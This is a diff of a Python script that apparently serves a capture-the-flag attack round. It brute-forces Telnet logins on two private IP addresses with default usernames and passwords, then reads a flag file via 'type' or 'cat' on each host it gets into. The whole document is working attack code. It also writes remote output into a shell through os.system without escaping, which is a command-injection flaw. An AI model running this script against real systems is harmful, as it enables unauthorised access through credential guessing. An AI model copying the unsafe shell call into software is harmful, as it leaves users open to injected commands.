@@ -1,38 +1,34 @@
-import telnetlib
+from time import sleep
 from os import system
-import threading
-import time
-
-windows_flag_path="C:\\flag.txt"
-linux_flag_path="/flag.txt"
-
+from telnetlib import Telnet
+from threading import Thread
 
 def con_telnet(host,username,password):
-        tl=telnetlib.Telnet(host=host,port=23)
-        tl.read_until(":".encode())
-        tl.write((username+"\r\n").encode())
-        tl.read_until(":".encode())
-        tl.write((password+"\r\n").encode())
-        t=tl.read_until(username.encode(),timeout=5)
-        if  t.find(b"incorrect") != -1:
-            pass
+    tel=Telnet(host=host)
+    tel.read_until(":".encode())
+    tel.write((username+"\r\n").encode())
+    tel.read_until(":".encode())
+    tel.write((password+"\r\n").encode())
+    t=tel.read_until(username.encode(),timeout=5)
+    if (t.find("incorrect".encode()) != -1):
+        pass
+    else:
+        if(t.find(("["+username).encode()) == -1 ):
+            tel.write("type c:\\flag.txt\r\n".encode())
         else:
-            if (int(str(t).find("["+username))==-1):
-                tl.write(("type "+windows_flag_path+"\r\n").encode())
-            else:
-                tl.write(("cat "+linux_flag_path+"\r\n").encode())
-            tl.write("exit\r\n".encode())
-            print("try cat "+host+" flag.txt,write the value into "+host+".txt")
-            system("echo \"" + tl.read_until("closed".encode()).decode().replace("\r","") + "\" > "+host+".txt")
+            tel.write("cat /flag.txt\r\n".encode())
+        tel.write("exit\r\n".encode())
+        data=tel.read_all().decode()
+        print(f"get flag {host} {username} {password}")
+        system("echo \""+data +"\" > "+host+".txt")
 
 if __name__ == "__main__":
-    host_list=["192.168.158.144","192.168.158.136"]
+    host_list=["192.168.158.136","192.168.158.144"]
     username_list=["Administrator","root"]
     password_list=["qwe`123","toor"]
-    for ip in host_list:
+    for host in host_list:
         for username in username_list:
             for password in password_list:
-                #con_telnet(ip,username,password)
-                t=threading.Thread(target=con_telnet,args=(ip,username,password))
+                t=Thread(target=con_telnet,args=(host,username,password))
                 t.start()
-                time.sleep(1)
+                sleep(0.5)
